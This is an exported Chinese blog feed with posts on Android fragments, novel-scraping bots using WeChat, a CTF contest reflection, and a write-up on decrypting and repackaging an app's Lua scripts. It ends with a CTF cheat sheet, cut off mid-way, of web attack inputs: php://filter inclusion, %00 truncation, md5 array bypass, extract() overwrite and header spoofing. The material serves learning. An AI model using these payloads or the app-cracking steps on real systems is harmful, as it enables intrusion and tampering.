Intent(pakageContext, CheatActivity.class); intent.putExtra(EXTRA_ANSWER_IS_TRUE, answerIsTrue); return intent;&#125; 要传递多个参数可以需要在newIntent方法里添加多个参数 从extra获取数据 public boolean getBooleanExtra(String name, boolean defaultValue) 1getIntent().getBooleanExtra(EXTRA_ANSWER_IS_TRUE, false) 从子 activity 获取返回结果 public void startActivityForResult(Intent intent, int requestCode) 设置返回结果 public final void setResult(int resultCode)public final void setResult(int resultCode, Intent data) 父activity依据子activity的完成结果采取不同操作 默认的结果代码 -Activity.RESULT_CANCELED 返还intent 创建一个Intent 附加上extra信息 调用Activity.setResult(int, Intent)方法 添加一个方法协助解析出父activity能用的信息 处理返回结果 父类覆盖onActivityResult(...)方法获取子activity回传的值 检查请求代码和返回代码是否符合预期 第六章 Android SDK版本与兼容Android SDK版本所有的设置都保存在应用模块的build.gradle文件中。编译版本独占该文件，最低版本和目标版本在该文件中的作用是覆盖和设置配置文件AndroidManifest.xml 最低版本（minSdkVersion）以最低版本设置值为标准，操作系统会拒绝将应用安装在系统版本低于标准的设备上。 目标版本（targetSdkVersion）目标版本的设定值告知Android：应用是为哪个API级别设计的。大多数情况下，目标版本即最新发布的Android版本。 编译版本（compileSdkVersion）SDK最低版本和目标版本会通知给操作系统，而SDK编译版本只是你和编译器之间的私有信息。 编译目标的最佳选择为最新的API级别 兼容性问题将高API级别代码置于检查Android设备版本的条件语句中 1if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP) Build.VERSION.SDK_INT常量代表了Android设备的版本号 第七章 UI fragment与fragment管理器引入Fragment采用fragment而不是activity来管理应用UI，可绕开Android系统activity使用规则的限制 fragment是一种控制器对象， activity可委派它执行任务。这些任务通常就是管理用户界面。受管的用户界面可以是一整屏或是整屏的一部分 创建 UI Fragment Fragment.onCreate(Bundle)是公共方法，而Activity.onCreate(Bundle)是受保护方法。Fragment.onCreate(Bundle)方法及其他Fragment生命周期方法必须是公共方法，因为托管fragment的activity要调用它们 类似于activity， fragment同样具有保存及获取状态的bundle。如同使用Activity. onSaveInstanceState(Bundle)方法那样，你也可以根据需要覆盖Fragment.onSaveInstanceState(Bundle)方法 fragment的视图是在onCreateView(LayoutInflater inflater, ViewGroup container方法里生成的。该 方 法 实 例 化 fragment 视 图 的 布 局 ， 然 后 将 实 例 化 的View返 回 给 托 管activity 。LayoutInflater及ViewGroup是实例化布局的必要参数。 Bundle用来存储恢复数据，可供该方法从保存状态下重建视图 向 FragmentManager添加 UI fragment 在Activity中的onCreate(...)里获取FragmentManager： 1FragmentManager fm = getSupportFragmentManager(); 获取FragmentManager之后，再获取一个fragment交给它管理 1234567Fragment fragment = fm.findFragmentById(R.id.fragment_container);if (fragment == null) &#123; fragment = new CrimeFragment(); fm.beginTransaction() .add(R.id.fragment_container, fragment) .commit();&#125; (创建一个新的fragment事务，执行一个fragment添加操作，然后提交该事务) fragment事务被用来添加、移除、附加、分离或替换fragment队列中的fragment。 FragmentManager.beginTransaction()方法创建并返回FragmentTransaction实例。FragmentTransaction类支持流接口（fluent interface）的链式方法调用，以此配置FragmentTransaction再返回它。 其中add(...)方法是整个事务的核心，它有两个参数：容器视图资源ID和新创建的CrimeFragment。容器视图资源ID有两个作用： ①. 告诉FragmentManager，fragment视图应该出现在activity视图的什么位置； ②. 唯一标识FragmentManager队列中的fragment。 采用fragment的应用架构设计应用时，正确使用fragment非常重要。fragment是用来封装关键组件以方便复用。实践证明，应用单屏最多使用2~3个fragment 拓展：极限编程方法论中有个YAGNI原则。 YAGNI（ You Aren’t Gonna Need It）的意思是“你不会需要它”，该原则鼓励大家不要去实现那些有可能需要的东西。为什么呢？因为你不会需要它。 对于fragment，我们坚持AUF（ Always Use Fragments）原则，即“总是使用fragment”。不值得为使用fragment还是activity伤脑筋。]]></content>
      <categories>
        <category>Android开发</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[对某视频解析软件的逆向分析]]></title>
    <url>%2F2020%2F03%2F07%2F%E5%AF%B9%E6%9F%90%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E8%BD%AF%E4%BB%B6%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[该app使用了Lua脚本并进行了加密，借此机会实践一下Lua脚本解密 前言最近偶然发现一款全网视频解析的软件，安装后发现首页有影响使用体验的广告存在（现在作者已取消广告），同时其附加功能需要加群获取密码才能使用。借这个机会尝试通过逆向工程分析其逻辑，同时这个App使用了Lua脚本并进行了加密，也借此机会实践一下Lua脚本的解密 软件的原始版本下载：原始版本 软件截图 首页 VIP功能 VIP功能 工具 apktool—可以将apk资源解码，并在修改后可以重新构建它们，它还可以执行一些自动化任务，例如构建apk unluac.jar—是一个lua脚本反编译工具，适用于反编译lua开发的程序源码 分析过程 使用Apktool对其进行解包，解包到App目录下1apktool.bat d VIP终结者_5.2.2.apk -o App 执行完毕后进入App目录下 其中： assets：存放资源文件，包含Lua脚本 lib：本地库(Native Library)文件夹，包含编译后的本地代码(Native Code)的so文件 smail：存放smail文件，包含Dalvik字节码，是对App的Java代码反编译成字节码的结果 AndroidManifest.xml：包含App的信息 分析smail进入smail文件夹可以看到Java代码的结构： 发现存在com.androlua、com.luajava等包名，经搜索相关项目，判断App的大部分代码均来自AndroLua_pro。而AndroLua_pro是一个使用Lua语言编写的Android应用的项目，所以，Java代码极有可能并不是应用的主体部分，重要操作很有可能会写在Lua中，所以下面重点分析Lua脚本部分。 初步分析Lua进入assets可以看到里面存放了所有的Lua脚本及App的图片资源： 用winhex打开lua脚本: 发现并不是Lua明文代码，也不是编译后的luac文件。由此得知Lua脚本被加密了，需要对其进行解密 解密LuaAndroLua_Pro所使用的Lua工具LuaJava会加载依赖库libluajava.so，LuaJava会使用luaL_loadbuffer或者luaL_loadbufferx函数对Lua脚本进行加载，这个函数也是加入Lua脚本解密代码的常见位置，所以找到lib/armeabi/libluajava.so，用IDA打开并找到这个函数，按F5进行进一步分析： （上图为方便阅读，已反混淆变量名） 与AndroLua_Pro的原始代码比较，可以发现加入了Lua脚本解密的代码，分析该代码发现有一个IDA无法识别的函数sub_265E0(t, 255)，由于对IDA工具还有很多不懂的地方，故没有深入研究，初步猜测是t对255的取余运算（后面验证确实如此）。我们可以参考这一代码，使用C语言编写一个简单的解密工具： 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;unsigned char *decrypt(const unsigned char *buff, size_t size) &#123; unsigned char *buff1 = (unsigned char *) malloc(size); buff1[0] = 27; int t = 0; for (int i = 1; i &lt; size; i++) &#123; t += size; buff1[i] = buff[i] ^ (t % 255); &#125; return buff1;&#125;unsigned char buff[204800];int main(int argc, char *argv[]) &#123; char filename[20] = "main.lua"; if (argc == 2) strcpy(filename,argv[1]); printf("File name: %s \n", filename); FILE *fp = fopen(filename, "rb"); size_t size = 0; size = fread(buff, sizeof(unsigned char), 204800, fp); printf("File size: %ld \n", size); unsigned char *res = decrypt(buff, size); strcat(filename, "c"); FILE *fp1 = fopen(filename, "wb"); fwrite(res, sizeof(unsigned char), size, fp1); printf("Output: %s", filename); return 0;&#125; 编译这一代码为decrypt.exe，并拷贝到assets文件夹下，执行以下命令来解密config.lua脚本： 1decrypt.exe config.lua 解密后的文件为config.luac，使用文本编辑器观察可以发现其仍然不是Lua代码，而是编译后的luac文件，我们还需要使用unluac.jar对其进行反编译。 1java -jar unluac.jar --rawstring config.luac &gt; config_new.lua (如果原始的源码中含有中文，需使用--rawstring参数进行解码) 反编译后的config.lua脚本内容如下： 对Lua脚本的修改不是本文探讨的重点，故不做分析。 使用如下命令进行打包： 1apktool b App –o out/newApp.apk 打包后的apk文件没有签名是不能安装到手机上的，需要使用其他的签名工具来对apk签名如signapk.jar、auto-sign等 结语本文分析了在Android中Lua脚本的解密过程，可以看到，软件的开发和逆向分析虽然看似处于对立的层面，但是双方的博弈过程却又促进着各自的发展，这使得开发人员更加重视软件的安全性，逆向工程师们也与时俱进的学习新的知识来面对越来越复杂的安全工作。随着国家现在越来越重视互联网安全问题，很多法律法规的出台来约束互联网规范，我们更应该重视安全对于各行各业的影响和机遇。]]></content>
      <categories>
        <category>逆向分析</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[爬取某书网指定小说-微信版]]></title>
    <url>%2F2018%2F12%2F15%2F%E7%88%AC%E5%8F%96%E6%9F%90%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E5%B0%8F%E8%AF%B4-%E5%BE%AE%E4%BF%A1%E7%89%88%2F</url>
    <content type="text"><![CDATA[服务器版的小说爬虫，并借助python的itchat库实现微信对话式小说下载服务 实现功能微信端发送小说名到指定微信号（格式：小说名suqir作者），服务器开始在全书网(http://www.quanshuwang.com)爬取该小说，爬取完成后将询问是否下载，确认后将通过微信以文件的形式发送 源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#!/usr/bin/python#coding:utf-8import urllib.requestimport requests,reimport itchatfrom itchat.content import *class BookSpyder(object): """爬取指定小说-server版""" def __init__(self, book_name,book_author): super(BookSpyder, self).__init__() self.book_author = book_author self.headers = &#123;'User-Agent': 'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'&#125; self.url = 'http://www.quanshuwang.com/modules/article/search.php?searchkey='+urllib.request.quote(book_name.encode('gb2312'))+'&amp;searchtype=articlename&amp;searchbuttom.x=88&amp;searchbuttom.y=22' search_data = requests.get(self.url,headers=self.headers,allow_redirects=False) try: # 搜索结果唯一时 self.location = search_data.headers['location'].split() self.location2res(self.location[0]) except KeyError: self.location = re.findall(r'&lt;li&gt;&lt;a target="_blank" href="(.*?)".*?title="(.*?)".*&gt;(.*?)&lt;/a&gt;&lt;em class=.*?&gt;(.*?)&lt;a href=',search_data.content.decode('gbk')) for http in self.location: flag = self.location2res(http[0]) if flag == 1: break #link self.booklink = re.findall(r'class="leftso png_bg"&gt;&lt;a href="(.*?)"',self.res)[0] #正则匹配书名 self.book_name = re.findall(r'&lt;meta property="og:title" content="(.*?)"/&gt;',self.res)[0] response = requests.get(self.booklink,headers=self.headers).content.decode('gbk') #正则匹配所有章节及其链接 self.contents = re.findall(r'&lt;li&gt;&lt;a href="(.*?)" title="(.*?)"&gt;.*?&lt;/a&gt;&lt;/li&gt;',response) #总章数 self.len = len(self.contents) def location2res(self,location): flag = -1 self.res = requests.get(location,headers=self.headers).content.decode('gbk') author = re.findall(r'&lt;meta property="og:novel:author" content="(.*?)"',self.res)[0] if self.book_author == author: flag = 1 try: self.description = re.findall(r'介绍:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;/div&gt;',self.res,re.S)[0].replace('&amp;nbsp;','').replace('&lt;br /&gt;','') except IndexError: pass return flag def save(self): i = 0 #开始写入文件 with open('./book/suqir.txt','w',encoding='utf-8',errors='ignore') as text_save: text_save.write(self.book_name+'\n作者：'+self.book_author) if 'self.description' in dir(): text_save.write('\n简介：'+self.description) text_save.write('\n') for num in self.contents: #获取单章文本 text_r = requests.get(num[0],headers=self.headers) text_c = text_r.content text = text_c.decode('gb18030') #获取章节名 title = num[1].replace(re.findall(r'，共\d*字',num[1])[0],'') try: #正则匹配内容 text = re.findall(r'&lt;/script&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;script type="text/javascript"&gt;',text,re.S)[0] #数据清洗 text = text.replace('&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;','') text = text.replace('&lt;br /&gt;','') text = text.replace('\r\n\r\n','\r\n') text_save.write('\n') text_save.write(title) text_save.write('\n\n') text_save.write(text) text_save.write('\n') print('[*]%-30s\t完成度%.3f%%'%(title,(i+1) * 100 / self.len)) i += 1 except IndexError as e: print('【*】%s下载失败'%title) text_save.write('\n===全书完===\n==by苏乞儿==\n') def get_bookname(self): return self.book_name def get_bookauthor(self): return self.book_author def get_des(self): try: return self.description except AttributeError: return '无简介' def get_centents(self): return self.len def get_booklink(self): return self.booklinkdef getUserName(): itchat.auto_login(hotReload=True,enableCmdQR=2) onlyUser = itchat.search_friends(name='杰帅') return onlyUser[0]['UserName']@itchat.msg_register([TEXT],isFriendChat=True)def text_reply(msg): global userName if msg['FromUserName'] == userName: try: bookName,bookAuthor = msg['Text'].split('suqir') book = BookSpyder(bookName,bookAuthor) itchat.send('书名：%s\n作者：%s\n简介：%s' % (bookName,bookAuthor,book.get_des()),toUserName=userName) itchat.send('正在爬取《%s》...' % bookName,toUserName=userName) print('[*]正在爬取《%s》...' % bookName) book.save() itchat.send('爬取完毕！是否下载？(是/否)',toUserName=userName) except ValueError: if msg['Text'] == '是': print('[*]正在发送文件...') itchat.send('正在上传...',toUserName=userName) itchat.send_file('./book/suqir.txt',toUserName=userName) print('[*]已发送文件！\n等待下次请求...') itchat.send('感谢使用！',toUserName=userName) elif msg['Text'] == '否': itchat.send('已取消，感谢使用！',toUserName=userName)if __name__ == '__main__': print('[*]Starting...') userName = getUserName() itchat.run() 运行部分截图服务器端 客户端]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[利用微信实现小说更新提醒]]></title>
    <url>%2F2018%2F11%2F26%2F%E5%88%A9%E7%94%A8%E5%BE%AE%E4%BF%A1%E5%AE%9E%E7%8E%B0%E5%B0%8F%E8%AF%B4%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92%2F</url>
    <content type="text"><![CDATA[人生最痛苦的事莫过于小说断更！这篇文章将对这一问题给出一种Python+阿里云+微信的解决方法不过世界总是需要懒人的，因为有了懒人创造世界。这话不是我说的，是马爸爸说的： 懒不是傻懒，如果你想少干，就要想出懒的方法。要懒出风格，懒出境界。——马云 为此我专门买了一台服务器（9.9还包邮哦），反正以后还有很多地方用到服务器。 扯远了。。。利用服务器可以干很多事，比如接下来的利用微信第三方python库实现小说更新时通过微信将更新内容发给指定朋友。 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#!/usr/bin/python#coding:utf-8import time,itchat # 微信登录def vxLogin(rename): # enableCmdQR：在命令行中显示登录二维码，参数2是Linux系统下的字符宽度 itchat.auto_login(hotReload=True,enableCmdQR=2) friends = itchat.get_friends(update=True) for friend in reversed(friends): if friend['RemarkName'] == rename: toName = friend['UserName'] return toName# 检查更新def update(url,start,toName): import requests,re res = requests.get(url).content.decode('gb18030') lis = re.findall(r'&lt;li&gt;&lt;a href="(.*?)" title="(.*?)，.*?"&gt;',res) toName = vxLogin(rename=toName) for li in lis[start:]: end_str = li[1] try: end = int(re.findall(r'第[ ]?(.*?)[ ]?章',end_str)[0]) except ValueError: print('[*]小说更新了，但是章节序号为中文，我暂时不想处理。。。') #碰到这种情况再更新，懒 exit() if end &gt;= start+1: text = requests.get(li[0]).content.decode('gbk') re_text = re.findall(r'&lt;/script&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;script',text,re.S)[0] re_text = re_text.replace('&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;','') re_text = re_text.replace('&lt;br /&gt;','') re_text = re_text.replace('\r\n\r\n','\r\n') re_text = '%s\n%s\n\n' %(li[1],re_text) print('更新：%s' % li[1]) text = '最近更新了第%s章\n%s' % (end,re_text) length = len(text)//3 # 分3段发送 itchat.send(msg=text[:length], toUserName=toName) itchat.send(msg=text[length:(length*2)], toUserName=toName) itchat.send(msg=text[(length*2):], toUserName=toName) time.sleep(5) print('[*]更新完成！暂无最新章节') # 声明startNum为全局变量，这样就不会在这个函数内部新建变量 global startNum startNum = end time.sleep(3600)# 1小时更新检查一次if __name__ == '__main__': print('[*]Starting...') # 当前最新章节 startNum = 410 while True: update(url='http://www.quanshuwang.cn/book/137/137120',start=startNum,toName='杰帅')# toName为None时发给自己 # 持续运行 itchat.run() 这里的urlhttp://www.quanshuwang.cn/book/137/137120是我看的《一步偷天》在全书网的网址 运行结果服务器端： 微信端： 小说也看完了，终于又可以开始写bug了！！ 另外，这个博客只作分享交流技术用，大爷们不用打赏，真的不用，真的不用，（疯狂暗示中…）]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[爬取某书网指定小说]]></title>
    <url>%2F2018%2F11%2F07%2F%E7%88%AC%E5%8F%96%E6%9F%90%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E5%B0%8F%E8%AF%B4%2F</url>
    <content type="text"><![CDATA[初探Python - 用Python实现对小说的爬取并下载 起因最近看了一部基于小说改编的电视剧，闲的无聊就去看了看小说。但是大多数看书网站都有或多或少的广告，强迫症表示很难受，加之近来正在学习Python，便想着利用Python爬取小说的内容，远离广告的‘宠信’。 实现原理程序实现原理很简单，将用户输入的书名提交到全书网进行搜索，将返回的结果存在list中并展示给用户，对用户选择的书籍进行书籍内容的爬取，并写入文件。 存在的问题初次学习写这种爬虫，代码难免冗余难读，但关键部分均写有注释，在此分享出来以作交流。在实际操作过程中也遇到不少问题，比如：如果所查询的书籍在全书网中只有唯一的一本，全书网将直接通过location进行重定向到书籍详情页，与多本书的处理方式不一致，所以为了完美的获取书记简介必须写个if判断；再如：用户提交的书名必须经过gb2312编码并转urlencoding后才能查询到，否则服务器返回错误。。。不过，也可能是我第一次写，有更好的处理方法，希望自己继续努力吧！ 源代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151# -*- coding: utf-8 -*-import requests,sys,reimport urllib.requestclass Bookspider(object): """爬取全书网指定书籍并下载到本地""" def __init__(self): super(Bookspider, self).__init__() self.request = requests.session() self.headers = &#123; #随机指定user-agent 'User-Agent': 'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36' &#125; def book_search(self,name): print('[*]搜索中...') #全书网的搜索url #对name进行url编码：urllib.request.quote self.url = 'http://www.quanshuwang.com/modules/article/search.php?searchkey='+urllib.request.quote(name.encode('gb2312'))+'&amp;searchtype=articlename&amp;searchbuttom.x=88&amp;searchbuttom.y=22' #禁止重定向：allow_redirects=False search_data = self.request.get(self.url,headers=self.headers,allow_redirects=False) try: #所爬书籍唯一时被重定向到location self.location = search_data.headers['location'] #将str的location转换成list，方便计算length self.location = self.location.split() except KeyError as e: response = search_data.content.decode('gbk') #所爬书籍有多种结果时，返回所有书籍信息 self.location = re.findall(r'&lt;li&gt;&lt;a target="_blank" href="(.*?)".*?title="(.*?)".*&gt;(.*?)&lt;/a&gt;&lt;em class=.*?&gt;(.*?)&lt;a href=',response) return self.location def book_info(self): res = requests.get(self.location,headers=self.headers).content.decode('gbk') #正则匹配书名 self.bookname = re.findall(r'&lt;meta property="og:title" content="(.*?)"/&gt;',res)[0] #正则匹配书籍作者 self.author = re.findall(r'&lt;meta property="og:novel:author" content="(.*?)"/&gt;',res)[0] #正则匹配书记简介 re.S指定多行匹配 self.description = re.findall(r'&lt;meta property="og:description" content="(.*?)"/&gt;',res,re.S)[0].replace('&amp;nbsp;','').replace('&lt;br /&gt;','').replace(' ','') #正则匹配书籍目录 self.booklink = re.findall(r'class="leftso png_bg"&gt;&lt;a href="(.*?)"',res)[0] response = requests.get(self.booklink,headers=self.headers).content.decode('gbk') #正则匹配所有章节及其链接 self.contents = re.findall(r'&lt;li&gt;&lt;a href="(.*?)" title="(.*?)"&gt;.*?&lt;/a&gt;&lt;/li&gt;',response) #总章数 self.len = len(self.contents) def save(self): i = 0 #开始写入文件 with open('%s.txt'%self.bookname,'w',encoding='utf-8',errors='ignore') as text_save: text_save.write(self.bookname+'\n作者：'+self.author) text_save.write('\n简介：'+self.description) text_save.write('\n') for num in self.contents: #获取单章文本 text_r = requests.get(num[0],headers=self.headers) text_c = text_r.content text = text_c.decode('gbk') #获取章节名 title = num[1].replace(re.findall(r'，共\d*字',num[1])[0],'') try: #正则匹配内容 text = re.findall(r'&lt;/script&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;script type="text/javascript"&gt;',text,re.S)[0] except IndexError as e: print('【**】%s下载失败'%title) #数据清洗 text = text.replace('&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;','') text = text.replace('&lt;br /&gt;','') text = text.replace('\r\n\r\n','\r\n') text_save.write('\n') text_save.write(title) text_save.write('\n\n') text_save.write(text) text_save.write('\n') print('[*]%-30s\t完成度%.3f%%'%(title,(i+1) * 100 / self.len)) i += 1 text_save.write('\n===全书完===\n==by苏乞儿==\n') def get_item(self): item = len(self.location) return item def set_location(self,location): self.location = location def get_bookname(self): return self.bookname def get_author(self): return self.author #获取总章数 def get_chapter(self): return self.len def get_description(self): return self.descriptionif __name__ == '__main__': book = Bookspider() name = input('[*]请输入书名：') #查书 locations = book.book_search(name) item_sum = book.get_item() #以下为两种搜索结果的处理，1.所爬的书籍在全书网是唯一的，2.所爬的书籍在全书网有多本 if item_sum == 1: book.set_location(locations[0]) book.book_info() print('[*]%s共%d条搜索结果：\n'%(name,item_sum)) print('#'*150) print('[*]书名：%s'%book.get_bookname()) print('[*]作者：%s'%book.get_author()) print('[*]简介：%s'%book.get_description()) print('#'*150) choose1 = input('[*]是否继续下载？(y/n)') if choose1 == 'y' or choose1 == 'Y': print('\n[*]正在下载《%s》'%book.get_bookname()) #保存文本 book.save() else: print('\n[*]感谢使用！') sys.exit(1) else: j = 0 print('[*]%s共%d条搜索结果：\n'%(name,item_sum)) for item in locations: print('#'*150) print('[*]序号：%d'%(j+1)) print('[*]书名：%s'%item[1]) print('[*]作者：%s'%item[2]) print('[*]简介：%s'%item[3]) print('#'*150) j +=1 choose2 = int(input('\n\n请选择序号：')) if choose2 &gt;= 1 and choose2 &lt;= item_sum: print('\n[*]正在下载《%s》'%locations[choose2-1][1]) #设置书籍链接地址 book.set_location(locations[choose2-1][0]) book.book_info() #保存文本 book.save() else: print('\n[*]感谢使用！') sys.exit(1) print('\n[*]下载成功！') 部分运行截图： 下载的文本文件： 更新（2018年11月26日）后期使用过程发现还有不少bug，不过毕竟算第一篇爬虫，这边就不删除了，留个纪念吧！较完善的服务器版本在这里：爬取某书网指定小说-微信版]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[记一次CTF大赛的感受]]></title>
    <url>%2F2018%2F10%2F29%2F%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E5%A4%A7%E8%B5%9B%E7%9A%84%E6%84%9F%E5%8F%97%2F</url>
    <content type="text"><![CDATA[对山东省网络技术大赛的参赛体会和总结 前言10月27号的山东省网络技术大赛是我大学参加过的第一个比赛，在这个比赛中我和各大高校的大佬们共同在网络攻防CTF夺旗赛这一命题中进行角逐。其实在去之前我的心里是没有多少信心的（事实证明我的担心是有必要的），同时寄希望于其他选手水平也差不多，我也只看过一些基础的web方向的解题方法，只看过几篇关于隐写的题，因为在我看来这种比赛应该不会涉及到密码，逆向，溢出和隐写等等这几类题，然而。。。 先分享一下我比赛最后的排名情况： 我的成绩在里面不是特别理想，在39名选手中排在第11位，得分仅331，与前三名一千多的得分更是有着不小的差距（小声哔哔：前三是来自警察学院的未来的网警），但究其根本还是自己在网络安全这一领域还有很长的路要走。 下面是在这次比赛中我得到的一些经验和教训，特地分享出来，一来警示自己，二来以作交流。另外，我会在后面把所有题做一遍并写一篇write up(如果官方还没有关闭训练场) 不足 过分自信，轻视对手 解题时心静不下来，导致做题时没有深入，往往错过很多会做的题 没有设立明确的目标，导致会的题因为较其他选手稍晚得到flag，得分较低；不会的题又没有尝试去解 在网络安全领域坐井观天，没有保持一颗学习的心态 受益 心中始终坚信：学无止境 积累了大赛经验，后续参加此类比赛不至于手忙脚乱 坚守自己的底线 展望在经历了此次比赛后，虽然没有取得满意的成绩，但也更加坚定了对未来继续扩展学习方向的信心。接下来的近一年时间，我将根据时间安排准备下一届的网络安全大赛，同时进行PHP、Python等语言的学习，争取将各个CTF大赛的题看一遍write up或自己试解，希望能在下一届的比赛中获得一个令自己比较满意的成绩。 人生没有退路，只有不停地选择！]]></content>
      <categories>
        <category>渗透</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CTF]]></title>
    <url>%2F2018%2F10%2F12%2FCTF%2F</url>
    <content type="text"><![CDATA[本文总结了CTF中我所遇到的题型及其write up，本文长期更新 希望各位多多评论指正，也算作对我第一次写技术文章的鼓励！ 训练场：南京邮电大学CTF题库 直接查看源码出现场景：一般出现在第一题 write up： 直接Ctrl+u查看网页源码寻找flag 修改maxlength出现场景：输入框输入内容有位数限制 write up：F12进入开发者模式修改maxlength后提交 IP伪造各种伪造IP的HTTP头： 序号 伪造方式 1 X-Forwarded-For 2 Client-IP 3 x-remote-IP 4 x-originating-IP 5 x-remote-addr 进制转换源码： 123456789101112131415161718192021&lt;?phpfunction noother_says_correct($number)&#123; $one = ord('1'); $nine = ord('9'); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == '54975581388';&#125;$flag='*******';if(noother_says_correct($_GET['key'])) echo $flag;else echo 'access denied';?&gt; 分析：要求传入key不包含数字[1-9]，但又等于54975581388，考虑转十六进制，发现54975581388=0xccccccccc,因此get方法传值key=0xccccccccc PHP弱类型类型一介绍：PHP在处理哈希字符串时，会利用“!=”或“==”来对哈希值进行比较，它把每一个以”0e”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0e”开头的，那么PHP将会认为他们相同，都是0 出现场景：PHP代码审计、含md5的题 write up： 修复方法：“===”和“!==”strict比较符，只有在类型相同时才相等。“==”和“!=”即non-strict比较符，会在类型转换后进行比较 扩展：0e开头MD5值小结 string md5() s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 类型二源码： 1234567if (isset($_GET['a']) and isset($_GET['b'])) &#123;if ($_GET['a'] != $_GET['b'])if (md5($_GET['a']) == md5($_GET['b']))die('Flag: '.$flag);elseprint 'Wrong.';&#125; 分析：$_GET可以接受数组但MD5()函数若传递进去一个数组，则会返回null.因此向$_GET数组传入两个名为a、b的不相等的数组从而导致md5()均返回空:index.php?a[]=1&amp;b[]=2（即null=null） 脑洞题 源码找url 源码看flag jjencode/aaencode（颜文字）介绍： 什么是jjencode? 将js代码转换成只有符号的字符串 什么是aaencode？ 将js代码转换成常用的网络表情 aaencode加密：http://utf-8.jp/public/aaencode.html 解法：可以直接利用浏览器的控制台输入密文，执行后即可解密。 文件包含漏洞典型的文件包含漏洞的格式网址：php?file=xxx.php 原因：网页后端php（或其他）代码中使用了include等文件包含语句，而且所包含的文件由变量控制，恰恰此变量又能通过GET或POST等方式进行修改所造成的 利用方法：构建file=php://filter/read=convert.base64-encode/resource=index.php 注：其中index.php可以为任意已包含文件返回base64加密过的index.php文件源码。 注意：python3中base64的解密为base64.b64decode() mysql 精度问题 intval()这个函数的作用是把参数自动转换成整数（int） $id = intval(1024.5)//结果为$id==1024 robots.txt介绍：robots.txt是搜索引擎中访问网站的时候要查看的第一个文件，robots.txt文件告诉了蜘蛛程序在服务器上什么文件是可以被查的。 %00源码： 12345678if (isset ($_GET['nctf'])) &#123; if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~';&#125; 涉及漏洞：查到资料 1.ereg会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00 2.当ntf为数组时它的返回值不是FALSE 利用方法： 1.?nctf=1%00%23biubiubiu 2.?nctf[]=1 变量覆盖源码： 123456789&lt;?php if ($_SERVER["REQUEST_METHOD"] == "POST") &#123; ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) &#123; ?&gt; &lt;div class="alert alert-success"&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php &#125; ?&gt;&lt;?php &#125; ?&gt; 分析：extract()函数的作用：从数组中将变量导入到当前的符号表 可以看到这里的代码为：extract($_POST)，即将POST的参数导入当前的符号表 由于extract()函数存在变量覆盖漏洞，所以提交post参数： pass=123&amp;thepassword_123=123//或者pass[]=&amp;thepassword_123 即:将两个变量的值修改成相同的，即可得到flag！ 上传绕过源码： 123456789文件上传&lt;br&gt;&lt;br&gt;&lt;form action="upload.php" method="post"enctype="multipart/form-data"&gt;&lt;label for="file"&gt;Filename:&lt;/label&gt;&lt;input type="hidden" name="dir" value="/uploads/" /&gt;&lt;input type="file" name="file" id="file" /&gt; &lt;br /&gt;&lt;input type="submit" name="submit" value="Submit" /&gt;&lt;/form&gt; 0x00截断绕过方法：在burpsuite—Hex中，将空格php后面一个字符的hex修改为00 SQL注入常规注入正常闭合源码： 1234567891011121314151617&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql="select user from ctf where (user='".$user."') and 